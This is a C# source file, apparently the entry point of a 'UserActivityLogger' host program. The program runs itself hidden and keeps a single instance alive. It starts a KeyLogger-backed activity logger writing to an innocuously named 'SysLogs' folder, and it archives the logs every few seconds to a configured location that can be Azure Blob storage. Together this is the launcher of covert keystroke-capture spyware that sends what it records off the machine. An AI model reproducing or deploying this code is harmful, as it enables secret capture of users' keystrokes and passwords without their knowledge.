using Core;
using System;
using System.Configuration;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Threading;
using UserActivityLogger;


namespace Host
{
    class Program
    {
        static string _logFolder;
        static void Main(string[] args)
        {

            if (SingleInstance.IsApplicationAlreadyRunning("UserActivityLoggerHost2"))
            {
                return;
            }

            //if (args.Length > 0 && args[0] == "hidden")

            if (true || args.Length > 0 && args[0] == "hidden")
            {
                _logFolder = Path.Combine(GetRootFolderPath(), "SysLogs");

                new UnhandledExceptionHandlercs().Register(ErrrorLogger.LogError);

                //new LogFileArchiver(GetFileSystem(), GetArchiveLocation()).StartPurging(_logFolder, TimeSpan.FromMinutes(5));

                new LogFileArchiver(GetFileSystem(), GetArchiveLocation()).StartPurging(_logFolder, TimeSpan.FromSeconds(5));

                var activityLogger = new ActivityLogger(TimeSpan.FromSeconds(2), _logFolder, new KeyLogger());

                ProcessHelper.Watch();

                activityLogger.StartLoging();

               
            }
            else
            {
         
                ProcessHelper.RunHidden(System.Reflection.Assembly.GetEntryAssembly().Location);
            }
        }


        static string GetRootFolderPath()
        {
            try
            {
                if (ConfigurationManager.AppSettings["DemoFolder"] != null)
                {
                    var rootFolder = ConfigurationManager.AppSettings["DemoFolder"].Trim();
                    if (!string.IsNullOrEmpty(rootFolder))
                    {
                        if (!Directory.Exists(rootFolder))
                        {
                            Directory.CreateDirectory(rootFolder);
                        }

                        return rootFolder;
                    }
                }
            }
            catch (Exception ex)
            {

            }

            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        }

        private static IFileSystem GetFileSystem()
        {
            var configuredFileSystem = ConfigurationManager.AppSettings["FileSystem"];
            if (string.IsNullOrEmpty(configuredFileSystem))
            {
                return new NtfsFileSystem();
            }


            switch (configuredFileSystem.ToUpperInvariant())
            {
                case "NTFS":
                    return new NtfsFileSystem();
                    break;
                case "AZUREBLOB":
                    return new AzureBlobFileSystem(ConfigurationManager.AppSettings["StorageConnectionString"]);
                    break;
            }

            return new NtfsFileSystem();
        }
        private static string GetArchiveLocation()
        {
            return ConfigurationManager.AppSettings["ArchiveLocation"];
        }
    }
}
